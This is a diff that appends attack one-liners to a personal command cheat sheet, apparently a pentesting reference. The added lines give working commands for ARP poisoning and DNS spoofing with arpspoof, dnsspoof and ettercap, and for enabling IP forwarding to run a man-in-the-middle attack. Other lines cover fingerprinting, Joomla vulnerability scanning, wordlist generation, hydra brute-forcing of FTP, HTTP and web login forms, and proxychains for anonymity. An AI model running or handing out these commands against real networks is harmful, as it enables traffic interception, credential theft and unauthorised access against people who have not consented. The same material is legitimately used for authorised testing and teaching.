@@ -89,5 +89,51 @@ ssh -fN 443:localhost:22 root@myvpsserver
 # Syncronize remote folders
 rsync -Cravzp /path/of/origin user@remotemachine:/path/of/destiny
 
+# to ping several hosts
+fping -c1 -g 192.168.1.0 192.168.1.255
+
+# Avoid ICMP packages
+iptables -A INPUT -p icmp --icmp-type 8 -d 192.168.1.0/24 -j DROP
+
+# Mount packages TCP/IP
+hping3 --fin --syn --rst --ack --urg -c 4 -p 80 192.168.1.1
+
+# Fingerprint
+xprobe2 -A -T 80 site.com
+amap 192.168.1.16 80
+
+# Joomla Scanner of Vulnerabilities
+joomscan -u htttp://site.com
+
+# Show ARP Table
+arp -a
+
+# ARP Poisoning Attack
+arpspoof -i eth0 -t 192.168.0.28 -r 192.168.0.13
+
+# Enable Global Routing
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# DNS Poisoning Attack
+dnsspoof -i eth0
+
+# Ettercap Tooltik Attack
+ettercap -G
+ettercap -Tq -i eth0 -M arp /192.168.0.1// /192.168.0.2-254//
+ettercap -q -T -i eth0 -M arp -P dns_spoof ///
+
+# Generate a wordlists
+crunch 6 8 abcd123
+cewl site.com -m 4
+./cupp.py -i
+
+# Using bruteforce
+hydra -L loginlist.txt -P passlist.txt 192.168.0.1 ftp
+hydra -l root -p password site.com http-get /path/
+hydra -l admin -x 2:2:a site.com http-form "path.php:login=^USER^&pw=^PASS^:Deny"
+
+# Circuit of proxies for anonymity
+proxychains firefox
+proxychains nmap
 
 ```
